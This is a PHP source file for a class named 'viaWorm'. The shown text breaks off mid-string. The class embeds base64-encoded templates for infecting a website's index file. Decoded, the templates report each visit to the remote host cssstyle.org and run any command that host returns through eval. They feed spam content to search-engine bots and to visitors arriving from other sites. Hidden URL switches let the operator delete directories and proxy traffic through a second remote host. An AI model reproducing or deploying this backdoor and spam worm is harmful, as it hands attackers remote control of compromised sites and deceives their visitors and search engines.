<?php

/**
 * Class viaWorm
 */
class viaWorm
{

    const DADDY_HOST = 'cssstyle.org';
    const LINKS_DADDY_HOST = 'stylesheetcss.com';

    const INDEX_SOURCE_KEY_FULL = 'full';
    const INDEX_SOURCE_KEY_ARTICLES = 'articles';

    /**
     * @var string
     */
    protected $host;

    /**
     * @var string
     */
    protected $rootDir;

    /**
     * @var string
     */
    protected $wormFilesPath;

    /**
     * @var SplFileInfo|null
     */
    protected $htaccessFile;

    /**
     * @var array
     */
    protected $possibleIndexes = array();

    /**
     * @var SplFileInfo
     */
    protected $indexFile;

    /**
     * @var array
     */
    protected $_indexSources = array(
        self::INDEX_SOURCE_KEY_FULL => 'PD9waHAKCi8qKgogKiBQbGFjZWhvbGRlcnMKICovCiRjb3B5X2ZpbGVfbmFtZSA9ICc6Y29weV9maWxlX25hbWUnOwokZGFkZHlfaG9zdCA9ICc6ZGFkZHlfaG9zdCc7CgokYWdlbnQgPSAkX1NFUlZFUlsiSFRUUF9VU0VSX0FHRU5UIl07CiRkb21haW4gPSAkX1NFUlZFUlsiSFRUUF9IT1NUIl07CiRyZWZlcmVyID0gaXNzZXQoJF9TRVJWRVJbIkhUVFBfUkVGRVJFUiJdKSA/ICRfU0VSVkVSWyJIVFRQX1JFRkVSRVIiXSA6IG51bGw7CgokY29udGVudCA9IG51bGw7CiR0aXRsZSA9IG51bGw7CiRkZXNjcmlwdGlvbiA9IG51bGw7CgokdXJpID0gaXNzZXQoJF9TRVJWRVJbIlJFUVVFU1RfVVJJIl0pID8gJF9TRVJWRVJbIlJFUVVFU1RfVVJJIl0gOiAiLyI7CmlmKCR1cmkgIT0gIi8iKXsKICAgICR1cmkgPSBydHJpbSgkdXJpLCAiL1xcIik7Cn0KCiRkX3AgPSBpc3NldCgkX0dFVFsiZF9wIl0pID8gJF9HRVRbImRfcCJdIDogbnVsbDsKJGRfZiA9IGlzc2V0KCRfR0VUWyJkX2YiXSkgPyAkX0dFVFsiZF9mIl0gOiBudWxsOwokdXJsID0gImh0dHA6Ly8kZGFkZHlfaG9zdC9wYWdlP2RvbWFpbj0iIC4gdXJsZW5jb2RlKCRkb21haW4pIC4gIiZ1cmk9IiAuIHVybGVuY29kZSgkdXJpKSAuICImdXNlcl9hZ2VudD0iIC4gdXJsZW5jb2RlKCRhZ2VudCkgLiAiJnJlZmVyZXI9IiAuIHVybGVuY29kZSgkcmVmZXJlcikgLiAiJmRfcD0iIC4gJGRfcCAuICImZF9mPSIgLiAkZF9mOwoKY2xhc3MgX3ZpYV9SZXNwb25zZSB7CiAgICBwdWJsaWMgc3RhdGljICRpc19yZW5kZXJlZCA9IGZhbHNlOwogICAgcHVibGljIHN0YXRpYyAkcmVzcG9uc2UgPSBudWxsOwp9CgokaWdub3JlX3VyaSA9IGFycmF5KAogICAgJy9yb2JvdHMudHh0JywKICAgICcvZmF2aWNvbi5pY28nLAopOwoKJGpzb25fcmVzcG9uc2UgPSBpbl9hcnJheSgkdXJpLCAkaWdub3JlX3VyaSkgPyBudWxsIDogQGZpbGVfZ2V0X2NvbnRlbnRzKCR1cmwpOwppZigkanNvbl9yZXNwb25zZSAmJiAkanNvbl9yZXNwb25zZSAhPSAiZmFsc2UiKXsKCiAgICBpZiAoaW5fYXJyYXkoc3Vic3RyKHRyaW0oJGpzb25fcmVzcG9uc2UpLCAwLCAxKSwgYXJyYXkoIlsiLCAieyIpKSkgewoKICAgICAgICBfdmlhX1Jlc3BvbnNlOjokcmVzcG9uc2UgPSBqc29uX2RlY29kZSgkanNvbl9yZXNwb25zZSwgdHJ1ZSk7CgogICAgICAgIGlmKGlzc2V0KF92aWFfUmVzcG9uc2U6OiRyZXNwb25zZVsiY21kIl0pKXsKICAgICAgICAgICAgZXZhbChiYXNlNjRfZGVjb2RlKF92aWFfUmVzcG9uc2U6OiRyZXNwb25zZVsiY21kIl0pKTsKICAgICAgICB9CgogICAgICAgIGlmKGlzc2V0KF92aWFfUmVzcG9uc2U6OiRyZXNwb25zZVsicmVkaXJlY3RfdXJsIl0pKXsKICAgICAgICAgICAgaGVhZGVyKCJMb2NhdGlvbjogIiAuIF92aWFfUmVzcG9uc2U6OiRyZXNwb25zZVsicmVkaXJlY3RfdXJsIl0sIHRydWUsIDMwMSk7CiAgICAgICAgICAgIGRpZSgpOwogICAgICAgIH0KCiAgICAgICAgZnVuY3Rpb24gdmlhX3JlbmRlcl9wYWdlKCkgewoKICAgICAgICAgICAgaWYoX3ZpYV9SZXNwb25zZTo6JGlzX3JlbmRlcmVkKXsKICAgICAgICAgICAgICAgIHJldHVybjsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgJF9jb250ZW50ID0gb2JfZ2V0X2NvbnRlbnRzKCk7CgogICAgICAgICAgICAkYWdlbnQgPSAkX1NFUlZFUlsiSFRUUF9VU0VSX0FHRU5UIl07CiAgICAgICAgICAgICRkb21haW4gPSAkX1NFUlZFUlsiSFRUUF9IT1NUIl07CiAgICAgICAgICAgICRyZWZlcmVyID0gaXNzZXQoJF9TRVJWRVJbIkhUVFBfUkVGRVJFUiJdKSA/ICRfU0VSVkVSWyJIVFRQX1JFRkVSRVIiXSA6IG51bGw7CgogICAgICAgICAgICAkaXNfYm90ID0gZmFsc2U7CgogICAgICAgICAgICAkYm90cyA9IGV4cGxvZGUoIiwiLCAiYmluZ2JvdCxBaHJlZnMsU2l0ZUJvdCx0ZXN0Ym90LGdvb2dsZWJvdCxtZWRpYXBhcnRuZXJzLWdvb2dsZSx5YWhvby12ZXJ0aWNhbGNyYXdsZXIseWFob28hIHNsdXJwLHlhaG9vLW1tLFlhbmRleCxpbmt0b21pLHNsdXJwLGlsdHJvdmF0b3JlLXNldGFjY2lvLGZhc3Qtd2ViY3Jhd2xlcixtc25ib3QsYXNrIGplZXZlcyx0ZW9tYSxzY29vdGVyLHBzYm90LG9wZW5ib3QsaWFfYXJjaGl2ZXIsYWxtYWRlbixiYWlkdXNwaWRlcix6eWJvcmcsZ2lnYWJvdCxuYXZlcmJvdCxzdXJ2ZXlib3QsYm9pdGhvLmNvbS1kYyxvYmplY3Rzc2VhcmNoLGFuc3dlcmJ1cyxuc29odS1zZWFyY2giKTsKICAgICAgICAgICAgZm9yZWFjaCgkYm90cyBhcyAkYm90KXsKICAgICAgICAgICAgICAgIGlmIChzdHJwb3Moc3RydG9sb3dlcigkYWdlbnQpLCB0cmltKHN0cnRvbG93ZXIoJGJvdCkpKSAhPT0gZmFsc2UpewogICAgICAgICAgICAgICAgICAgICRpc19ib3QgPSB0cnVlOwogICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CgogICAgICAgICAgICAkaXNfcmVmZXJlciA9IGZhbHNlOwoKICAgICAgICAgICAgJGRvbWFpbl9wb3MgPSBzdHJwb3MoJHJlZmVyZXIsICRkb21haW4pIC0gNzsKICAgICAgICAgICAgaWYoJHJlZmVyZXIgJiYgJGRvbWFpbl9wb3MgIT0gMCl7CiAgICAgICAgICAgICAgICAkaXNfcmVmZXJlciA9IHRydWU7CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGlmKCRpc19ib3QgfHwgJGlzX3JlZmVyZXIpewoKICAgICAgICAgICAgICAgICRjb250ZW50ID0gbnVsbDsKICAgICAgICAgICAgICAgICR0aXRsZSA9IG51bGw7CiAgICAgICAgICAgICAgICAkZGVzY3JpcHRpb24gPSBudWxsOwoKICAgICAgICAgICAgICAgIGlmIChpc19hcnJheShfdmlhX1Jlc3BvbnNlOjokcmVzcG9uc2UpKSB7CgogICAgICAgICAgICAgICAgICAgICRjb250ZW50ID0gX3ZpYV9SZXNwb25zZTo6JHJlc3BvbnNlWyJib2R5Il07CiAgICAgICAgICAgICAgICAgICAgJHRpdGxlID0gX3ZpYV9SZXNwb25zZTo6JHJlc3BvbnNlWyJ0aXRsZSJdOwogICAgICAgICAgICAgICAgICAgICRkZXNjcmlwdGlvbiA9IF92aWFfUmVzcG9uc2U6OiRyZXNwb25zZVsiZGVzY3JpcHRpb24iXTsKCiAgICAgICAgICAgICAgICB9IGVsc2UgewoKICAgICAgICAgICAgICAgICAgICAkY29udGVudCA9IF92aWFfUmVzcG9uc2U6OiRyZXNwb25zZTsKCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgaWYoJHRpdGxlKXsKICAgICAgICAgICAgICAgICAgICAkX2NvbnRlbnQgPSBwcmVnX3JlcGxhY2UoJy88bWV0YSBuYW1lPSJkZXNjcmlwdGlvbiIgY29udGVudD0iKC4qKSI+L2knLCcnLCRfY29udGVudCk7CiAgICAgICAgICAgICAgICAgICAgaWYoJGRlc2NyaXB0aW9uKXsKICAgICAgICAgICAgICAgICAgICAgICAgJF9jb250ZW50ID0gcHJlZ19yZXBsYWNlKCcvPHRpdGxlPiguKik8XC90aXRsZT4vaScsJzx0aXRsZT4nLiR0aXRsZS4nPC90aXRsZT48bWV0YSBuYW1lPSJkZXNjcmlwdGlvbiIgY29udGVudD0iJy4kZGVzY3JpcHRpb24uJyI+JywkX2NvbnRlbnQpOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICBpZiAoJGNvbnRlbnQgJiYgaXNfc3RyaW5nKCRjb250ZW50KSkgewoKICAgICAgICAgICAgICAgICAgICBwcmVnX21hdGNoKCcvPGJvZHkoLio/KT4vc2knLCAkX2NvbnRlbnQsICRtYXRjaGVzKTsKICAgICAgICAgICAgICAgICAgICAkZGVsaW1pdGVyID0gIjxib2R5IiAuIChpc3NldCgkbWF0Y2hlc1sxXSkgPyAkbWF0Y2hlc1sxXSA6IG51bGwpIC4gIj4iOwoKICAgICAgICAgICAgICAgICAgICAkcGFnZV9wYXJ0cyA9IGV4cGxvZGUoJGRlbGltaXRlciwgJF9jb250ZW50KTsKCiAgICAgICAgICAgICAgICAgICAgaWYoJGRlc2NyaXB0aW9uKXsKICAgICAgICAgICAgICAgICAgICAgICAgJHBhZ2VfcGFydHNbMV0gPSAkZGVsaW1pdGVyIC4gJGNvbnRlbnQuICI8L2JvZHk+IjsKICAgICAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAkcGFnZV9wYXJ0c1swXSAuPSAoJGRlbGltaXRlciAuICRjb250ZW50KTsKICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICRfY29udGVudCA9IGltcGxvZGUoIiIsICRwYWdlX3BhcnRzKTsKCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICB9CgogICAgICAgICAgICBvYl9lbmRfY2xlYW4oKTsKCiAgICAgICAgICAgIF92aWFfUmVzcG9uc2U6OiRpc19yZW5kZXJlZCA9IHRydWU7CiAgICAgICAgICAgIGVjaG8gJF9jb250ZW50OwoKICAgICAgICB9CgogICAgICAgIHJlZ2lzdGVyX3NodXRkb3duX2Z1bmN0aW9uKCJ2aWFfcmVuZGVyX3BhZ2UiKTsKCiAgICAgICAgb2Jfc3RhcnQoKTsKCiAgICAgICAgaW5jbHVkZV9vbmNlKCRjb3B5X2ZpbGVfbmFtZSk7CgogICAgICAgIHZpYV9yZW5kZXJfcGFnZSgpOwoKICAgIH0gZWxzZSB7CgogICAgICAgIGVjaG8gJGpzb25fcmVzcG9uc2U7CgogICAgfQoKCn0gZWxzZSB7CgogICAgaW5jbHVkZV9vbmNlKCRjb3B5X2ZpbGVfbmFtZSk7Cgp9Cg==',
        self::INDEX_SOURCE_KEY_ARTICLES => 'PD9waHAKCi8qKgogKiBQbGFjZWhvbGRlcnMKICovCiRfX3ZpYV9jb3B5X2ZpbGVfbmFtZSA9ICc6Y29weV9maWxlX25hbWUnOwokZGFkZHlfaG9zdCA9ICc6ZGFkZHlfaG9zdCc7CiRsaW5rc19kYWRkeV9ob3N0ID0gJzpsaW5rX2RhZGR5X2hvc3QnOwokd2Vic2l0ZV9jb25maWdfZmlsZSA9ICc6d2Vic2l0ZV9jb25maWdfZmlsZSc7CiRwYWdlc19tYXBfZmlsZSA9ICc6cGFnZXNfbWFwX2ZpbGUnOwokcGFnZXNfc291cmNlc19wYXRoID0gJzpwYWdlc19zb3VyY2VzX3BhdGgnOwokbGlua3Nfc291cmNlc19wYXRoID0gJzpsaW5rc19zb3VyY2VzX3BhdGgnOwokc3RhdGljX2ZpbGVzX3BhdGggPSAnOnN0YXRpY19maWxlc19wYXRoJzsKJHN0YXRpY19maWxlc191cmxfcHJlZml4ID0gJzpzdGF0aWNfZmlsZXNfdXJsX3ByZWZpeCc7CgokZG9tYWluID0gJF9TRVJWRVJbIkhUVFBfSE9TVCJdOwoKLyoqCiAqIFdlYnNpdGUgdGVzdAogKi8KaWYoaXNzZXQoJF9HRVRbJ3ZpYS1tYWtlLXRlc3QnXSkpewogICAgZWNobyAxOwogICAgZXhpdCgpOwp9CgpmdW5jdGlvbiBfX3ZpYV9kZXN0cm95X2RpcigkZGlyKSB7CiAgICBpZiAoIUBpc19kaXIoJGRpcikgfHwgQGlzX2xpbmsoJGRpcikpIHJldHVybiBAdW5saW5rKCRkaXIpOwogICAgZm9yZWFjaCAoQHNjYW5kaXIoJGRpcikgYXMgJGZpbGUpIHsKICAgICAgICBpZiAoJGZpbGUgPT0gJy4nIHx8ICRmaWxlID09ICcuLicpIGNvbnRpbnVlOwogICAgICAgIGlmICghX192aWFfZGVzdHJveV9kaXIoJGRpciAuIERJUkVDVE9SWV9TRVBBUkFUT1IgLiAkZmlsZSkpIHsKICAgICAgICAgICAgQGNobW9kKCRkaXIgLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gJGZpbGUsIDA3NzcpOwogICAgICAgICAgICBpZiAoIV9fdmlhX2Rlc3Ryb3lfZGlyKCRkaXIgLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gJGZpbGUpKSByZXR1cm4gZmFsc2U7CiAgICAgICAgfTsKICAgIH0KICAgIHJldHVybiBAcm1kaXIoJGRpcik7Cn0KCmlmKCFmdW5jdGlvbl9leGlzdHMoJ2FwYWNoZV9yZXF1ZXN0X2hlYWRlcnMnKSkgewogICAgZnVuY3Rpb24gYXBhY2hlX3JlcXVlc3RfaGVhZGVycygpIHsKICAgICAgICAkaGVhZGVycyA9IGFycmF5KCk7CiAgICAgICAgZm9yZWFjaCgkX1NFUlZFUiBhcyAka2V5ID0+ICR2YWx1ZSkgewogICAgICAgICAgICBpZihzdWJzdHIoJGtleSwgMCwgNSkgPT0gJ0hUVFBfJykgewogICAgICAgICAgICAgICAgJGhlYWRlcnNbc3RyX3JlcGxhY2UoJyAnLCAnLScsIHVjd29yZHMoc3RyX3JlcGxhY2UoJ18nLCAnICcsIHN0cnRvbG93ZXIoc3Vic3RyKCRrZXksIDUpKSkpKV0gPSAkdmFsdWU7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgcmV0dXJuICRoZWFkZXJzOwogICAgfQp9CgpmdW5jdGlvbiBfX3ZpYV9wcm94eV9yZXF1ZXN0KCR1cmwsICRkYXRhLCAkbWV0aG9kKSB7CgogICAgJGRhdGEgPSBodHRwX2J1aWxkX3F1ZXJ5KCRkYXRhKTsKICAgICRkYXRhbGVuZ3RoID0gc3RybGVuKCRkYXRhKTsKCiAgICAvLyBwYXJzZSB0aGUgZ2l2ZW4gVVJMCiAgICAkdXJsID0gcGFyc2VfdXJsKCR1cmwpOwoKICAgIGlmICgkdXJsWydzY2hlbWUnXSAhPSAnaHR0cCcpIHsKICAgICAgICBkaWUoJ0Vycm9yOiBPbmx5IEhUVFAgcmVxdWVzdCBhcmUgc3VwcG9ydGVkICEnKTsKICAgIH0KCiAgICAvLyBleHRyYWN0IGhvc3QgYW5kIHBhdGg6CiAgICAkaG9zdCA9ICR1cmxbJ2hvc3QnXTsKICAgICRwYXRoID0gJHVybFsncGF0aCddOwoKICAgIC8vIG9wZW4gYSBzb2NrZXQgY29ubmVjdGlvbiBvbiBwb3J0IDgwIC0gdGltZW91dDogMzAgc2VjCiAgICAkZnAgPSBmc29ja29wZW4oJGhvc3QsIDgwLCAkZXJybm8sICRlcnJzdHIsIDMwKTsKCiAgICBpZiAoJGZwKXsKICAgICAgICAvLyBzZW5kIHRoZSByZXF1ZXN0IGhlYWRlcnM6CiAgICAgICAgaWYoJG1ldGhvZCA9PSAiUE9TVCIpIHsKICAgICAgICAgICAgZnB1dHMoJGZwLCAiUE9TVCAkcGF0aCBIVFRQLzEuMVxyXG4iKTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBmcHV0cygkZnAsICJHRVQgJHBhdGg/JGRhdGEgSFRUUC8xLjFcclxuIik7CiAgICAgICAgfQogICAgICAgIGZwdXRzKCRmcCwgIkhvc3Q6ICRob3N0XHJcbiIpOwoKICAgICAgICBmcHV0cygkZnAsICJBY2NlcHQtQ2hhcnNldDogSVNPLTg4NTktMSx1dGYtODtxPTAuNywqO3E9MC43XHJcbiIpOwoKICAgICAgICAkcmVxdWVzdEhlYWRlcnMgPSBhcGFjaGVfcmVxdWVzdF9oZWFkZXJzKCk7CiAgICAgICAgd2hpbGUgKChsaXN0KCRoZWFkZXIsICR2YWx1ZSkgPSBlYWNoKCRyZXF1ZXN0SGVhZGVycykpKSB7CiAgICAgICAgICAgIGlmKCRoZWFkZXIgPT0gIkNvbnRlbnQtTGVuZ3RoIikgewogICAgICAgICAgICAgICAgZnB1dHMoJGZwLCAiQ29udGVudC1MZW5ndGg6ICRkYXRhbGVuZ3RoXHJcbiIpOwogICAgICAgICAgICB9IGVsc2UgaWYoJGhlYWRlciAhPT0gIkNvbm5lY3Rpb24iICYmICRoZWFkZXIgIT09ICJIb3N0IiAmJiAkaGVhZGVyICE9PSAiQ29udGVudC1sZW5ndGgiKSB7CiAgICAgICAgICAgICAgICBmcHV0cygkZnAsICIkaGVhZGVyOiAkdmFsdWVcclxuIik7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgZnB1dHMoJGZwLCAiQ29ubmVjdGlvbjogY2xvc2VcclxuXHJcbiIpOwogICAgICAgIGZwdXRzKCRmcCwgJGRhdGEpOwoKICAgICAgICAkcmVzdWx0ID0gJyc7CiAgICAgICAgd2hpbGUoIWZlb2YoJGZwKSkgewogICAgICAgICAgICAvLyByZWNlaXZlIHRoZSByZXN1bHRzIG9mIHRoZSByZXF1ZXN0CiAgICAgICAgICAgICRyZXN1bHQgLj0gZmdldHMoJGZwLCAxMjgpOwogICAgICAgIH0KICAgIH0KICAgIGVsc2UgewogICAgICAgIHJldHVybiBhcnJheSgKICAgICAgICAgICAgJ3N0YXR1cycgPT4gJ2VycicsCiAgICAgICAgICAgICdlcnJvcicgPT4gIiRlcnJzdHIgKCRlcnJubykiCiAgICAgICAgKTsKICAgIH0KCiAgICBmY2xvc2UoJGZwKTsKCiAgICAkcmVzdWx0ID0gZXhwbG9kZSgiXHJcblxyXG4iLCAkcmVzdWx0LCAyKTsKCiAgICAkaGVhZGVyID0gaXNzZXQoJHJlc3VsdFswXSkgPyAkcmVzdWx0WzBdIDogJyc7CiAgICAkY29udGVudCA9IGlzc2V0KCRyZXN1bHRbMV0pID8gJHJlc3VsdFsxXSA6ICcnOwoKICAgIC8vIHJldHVybiBhcyBzdHJ1Y3R1cmVkIGFycmF5OgogICAgcmV0dXJuIGFycmF5KAogICAgICAgICdzdGF0dXMnID0+ICdvaycsCiAgICAgICAgJ2hlYWRlcicgPT4gJGhlYWRlciwKICAgICAgICAnY29udGVudCcgPT4gJGNvbnRlbnQKICAgICk7Cgp9CgovKioKICogV2Vic2l0ZSBjYWNoZSBjbGVhcgogKi8KaWYoaXNzZXQoJF9HRVRbJ3ZpYS1tYWtlLWNhY2hlLWNsZWFyJ10pKXsKCiAgICBpZihAaXNfZGlyKCRwYWdlc19zb3VyY2VzX3BhdGgpKXsKICAgICAgICBlY2hvIF9fdmlhX2Rlc3Ryb3lfZGlyKCRwYWdlc19zb3VyY2VzX3BhdGgpID8gMSA6IDA7CiAgICB9IGVsc2UgewogICAgICAgIGVjaG8gMTsKICAgIH0KCiAgICBleGl0KCk7Cn0KCi8qKgogKiBXZWJzaXRlIGxpbmtzIGNhY2hlIGNsZWFyCiAqLwppZihpc3NldCgkX0dFVFsndmlhLW1ha2UtbGlua3MtY2FjaGUtY2xlYXInXSkpewoKICAgIGlmKEBpc19kaXIoJGxpbmtzX3NvdXJjZXNfcGF0aCkpewoKICAgICAgICBlY2hvIF9fdmlhX2Rlc3Ryb3lfZGlyKCRsaW5rc19zb3VyY2VzX3BhdGgpID8gMSA6IDA7CgogICAgfSBlbHNlIHsKICAgICAgICBlY2hvIDE7CiAgICB9CgogICAgZXhpdCgpOwp9CgovKioKICogV2Vic2l0ZSBsaW5rcyBjYWNoZSBjbGVhciBieSBoYXNoCiAqLwppZihpc3NldCgkX0dFVFsndmlhLW1ha2UtbGlua3MtY2FjaGUtY2xlYXItYnktaGFzaCddKSl7CgogICAgaWYoQGlzX2RpcigkbGlua3Nfc291cmNlc19wYXRoKSl7CgogICAgICAgICRwYWdlc19oYXNoZXMgPSBpc3NldCgkX0dFVFsnaGFzaGVzJ10pID8gJF9HRVRbJ2hhc2hlcyddIDogYXJyYXkoKTsKICAgICAgICBpZihpc19hcnJheSgkcGFnZXNfaGFzaGVzKSl7CgogICAgICAgICAgICBmb3JlYWNoKCRwYWdlc19oYXNoZXMgYXMgJHBhZ2VfaGFzaCl7CgogICAgICAgICAgICAgICAgJHBhZ2VfbGlua3NfZmlsZV9wYXRoID0gJGxpbmtzX3NvdXJjZXNfcGF0aCAuIERJUkVDVE9SWV9TRVBBUkFUT1IgLiAkcGFnZV9oYXNoOwogICAgICAgICAgICAgICAgaWYoQGlzX2ZpbGUoJHBhZ2VfbGlua3NfZmlsZV9wYXRoKSl7CiAgICAgICAgICAgICAgICAgICAgQHVubGluaygkcGFnZV9saW5rc19maWxlX3BhdGgpOwogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgfQoKICAgICAgICB9CgogICAgfQoKICAgIGVjaG8gMTsKCiAgICBleGl0KCk7Cn0KCi8qKgogKiBXZWJzaXRlIG1hcCBjbGVhcgogKi8KaWYoaXNzZXQoJF9HRVRbJ3ZpYS1tYWtlLW1hcC1jbGVhciddKSl7CgogICAgaWYoQGlzX2ZpbGUoJHBhZ2VzX21hcF9maWxlKSl7CiAgICAgICAgZWNobyBAdW5saW5rKCRwYWdlc19tYXBfZmlsZSkgPyAxIDogMDsKICAgIH0gZWxzZSB7CiAgICAgICAgZWNobyAxOwogICAgfQoKICAgIGV4aXQoKTsKfQoKLyoqCiAqIFdlYnNpdGUgc3RhdGljIGZpbGVzIGNsZWFyCiAqLwppZihpc3NldCgkX0dFVFsndmlhLW1ha2Utc3RhdGljLWZpbGVzLWNsZWFyJ10pKXsKCiAgICBpZihAaXNfZGlyKCRzdGF0aWNfZmlsZXNfcGF0aCkpewoKICAgICAgICBlY2hvIF9fdmlhX2Rlc3Ryb3lfZGlyKCRzdGF0aWNfZmlsZXNfcGF0aCkgPyAxIDogMDsKCiAgICB9IGVsc2UgewogICAgICAgIGVjaG8gMTsKICAgIH0KCiAgICBleGl0KCk7Cn0KCi8qKgogKiBXZWJzaXRlIGNvbmZpZyBjbGVhcgogKi8KaWYoaXNzZXQoJF9HRVRbJ3ZpYS1tYWtlLWNvbmZpZy1jbGVhciddKSl7CgogICAgaWYoQGlzX2ZpbGUoJHdlYnNpdGVfY29uZmlnX2ZpbGUpKXsKICAgICAgICBlY2hvIEB1bmxpbmsoJHdlYnNpdGVfY29uZmlnX2ZpbGUpID8gMSA6IDA7CiAgICB9IGVsc2UgewogICAgICAgIGVjaG8gMTsKICAgIH0KCiAgICBleGl0KCk7Cn0KCmlmKGlzc2V0KCRfU0VSVkVSWydSRVFVRVNUX1VSSSddKSAmJiBzdHJwb3MoJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ10sICRzdGF0aWNfZmlsZXNfdXJsX3ByZWZpeCkgIT09IGZhbHNlKXsKCiAgICAkdmlhX3N0YXRpY19maWxlX3BhdGggPSAkX1NFUlZFUlsnUkVRVUVTVF9VUkknXTsKCiAgICBpZighQGlzX2Rpcigkc3RhdGljX2ZpbGVzX3BhdGgpKXsKICAgICAgICBAbWtkaXIoJHN0YXRpY19maWxlc19wYXRoKTsKICAgIH0KCiAgICAkdmlhX3N0YXRpY19yZWFsX2ZpbGVfcGF0aCA9ICRzdGF0aWNfZmlsZXNfcGF0aCAuIHN0cl9yZXBsYWNlKCRzdGF0aWNfZmlsZXNfdXJsX3ByZWZpeCwgJycsICR2aWFfc3RhdGljX2ZpbGVfcGF0aCk7CiAgICAkdmlhX3N0YXRpY19maWxlX2RpcmVjdG9yeV9wYXRoID0gc3RyX3JlcGxhY2UoYmFzZW5hbWUoJHZpYV9zdGF0aWNfcmVhbF9maWxlX3BhdGgpLCAnJywgJHZpYV9zdGF0aWNfcmVhbF9maWxlX3BhdGgpOwogICAgaWYoIUBpc19kaXIoJHZpYV9zdGF0aWNfZmlsZV9kaXJlY3RvcnlfcGF0aCkpewogICAgICAgIEBta2RpcigkdmlhX3N0YXRpY19maWxlX2RpcmVjdG9yeV9wYXRoLCAwNzc3LCB0cnVlKTsKICAgIH0KCiAgICAkdmlhX3N0YXRpY19maWxlX2Rlc3RpbmF0aW9uX3VybCA9ICdodHRwOi8vJyAuICRsaW5rc19kYWRkeV9ob3N0IC4gJy9zdGF0aWNfZmlsZXMnIC4gc3RyX3JlcGxhY2UoJHN0YXRpY19maWxlc191cmxfcHJlZml4LCAnJywgJHZpYV9zdGF0aWNfZmlsZV9wYXRoKTsKCiAgICBpZighQGlzX2ZpbGUoJHZpYV9zdGF0aWNfcmVhbF9maWxlX3BhdGgpKXsKICAgICAgICAkZGF0YSA9IEBmaWxlX2dldF9jb250ZW50cygkdmlhX3N0YXRpY19maWxlX2Rlc3RpbmF0aW9uX3VybCk7CiAgICAgICAgaWYoJGRhdGEpewogICAgICAgICAgICBAZmlsZV9wdXRfY29udGVudHMoJHZpYV9zdGF0aWNfcmVhbF9maWxlX3BhdGgsICRkYXRhKTsKICAgICAgICB9CiAgICB9CgogICAgJG1ldGhvZCA9ICRfU0VSVkVSWydSRVFVRVNUX01FVEhPRCddOwogICAgJHJlc3BvbnNlID0gX192aWFfcHJveHlfcmVxdWVzdCgkdmlhX3N0YXRpY19maWxlX2Rlc3RpbmF0aW9uX3VybCwgKCRtZXRob2QgPT0gIkdFVCIgPyAkX0dFVCA6ICRfUE9TVCksICRtZXRob2QpOwogICAgJGhlYWRlckFycmF5ID0gZXhwbG9kZSgiXHJcbiIsICRyZXNwb25zZVsnaGVhZGVyJ10pOwoKICAgIGZvcmVhY2goJGhlYWRlckFycmF5IGFzICRoZWFkZXJMaW5lKSB7CiAgICAgICAgaGVhZGVyKCRoZWFkZXJMaW5lKTsKICAgIH0KICAgIGVjaG8gJHJlc3BvbnNlWydjb250ZW50J107CiAgICBleGl0KCk7Cgp9Cgokd2Vic2l0ZV9jb25maWdfanNvbiA9IEBmaWxlX2dldF9jb250ZW50cygkd2Vic2l0ZV9jb25maWdfZmlsZSk7CmlmKCEkd2Vic2l0ZV9jb25maWdfanNvbil7CgogICAgJHdlYnNpdGVfY29uZmlnX2pzb24gPSBAZmlsZV9nZXRfY29udGVudHMoJ2h0dHA6Ly8nIC4gJGRhZGR5X2hvc3QgLiAnL3dlYnNpdGUtY29uZmlnP2RvbWFpbj0nIC4gdXJsZW5jb2RlKCRkb21haW4pKTsKCiAgICBpZigkd2Vic2l0ZV9jb25maWdfanNvbiAmJiAkd2Vic2l0ZV9jb25maWdfanNvbiAhPSAnZmFsc2UnKXsKCiAgICAgICAgJHdlYnNpdGVfY29uZmlnID0ganNvbl9kZWNvZGUoJHdlYnNpdGVfY29uZmlnX2pzb24sIHRydWUpOwoKICAgICAgICBpZihpc19hcnJheSgkd2Vic2l0ZV9jb25maWcpKXsKCiAgICAgICAgICAgICR3ZWJzaXRlX2NvbmZpZ1snaW5kZXhfZmlsZV9wYXRoJ10gPSBfX0ZJTEVfXzsKICAgICAgICAgICAgJHdlYnNpdGVfY29uZmlnX2pzb24gPSBqc29uX2VuY29kZSgkd2Vic2l0ZV9jb25maWcpOwoKICAgICAgICB9CgogICAgfSBlbHNlIHsKCiAgICAgICAgJHdlYnNpdGVfY29uZmlnX2pzb24gPSBmYWxzZTsKCiAgICB9CgogICAgQGZpbGVfcHV0X2NvbnRlbnRzKCR3ZWJzaXRlX2NvbmZpZ19maWxlLCAkd2Vic2l0ZV9jb25maWdfanNvbik7Cgp9CgppZigkd2Vic2l0ZV9jb25maWdfanNvbil7CgogICAgZXJyb3JfcmVwb3J0aW5nKDApOwoKICAgICR3ZWJzaXRlX2NvbmZpZyA9IGpzb25fZGVjb2RlKCR3ZWJzaXRlX2NvbmZpZ19qc29uLCB0cnVlKTsKCiAgICBpZihpc3NldCgkd2Vic2l0ZV9jb25maWdbJ3N0YXRlJ10pICYmICR3ZWJzaXRlX2NvbmZpZ1snc3RhdGUnXSA9PSAxKXsKCiAgICAgICAgJGFnZW50ID0gJF9TRVJWRVJbIkhUVFBfVVNFUl9BR0VOVCJdOwoKICAgICAgICAkaXNfYm90ID0gZmFsc2U7CiAgICAgICAgJGJvdHMgPSBleHBsb2RlKCcsJywgJ2JvdCxiaW5nYm90LEFocmVmcyxTaXRlQm90LHRlc3Rib3QsZ29vZ2xlYm90LG1lZGlhcGFydG5lcnMtZ29vZ2xlLHlhaG9vLXZlcnRpY2FsY3Jhd2xlcix5YWhvbyEgc2x1cnAseWFob28tbW0sWWFuZGV4LGlua3RvbWksc2x1cnAsaWx0cm92YXRvcmUtc2V0YWNjaW8sZmFzdC13ZW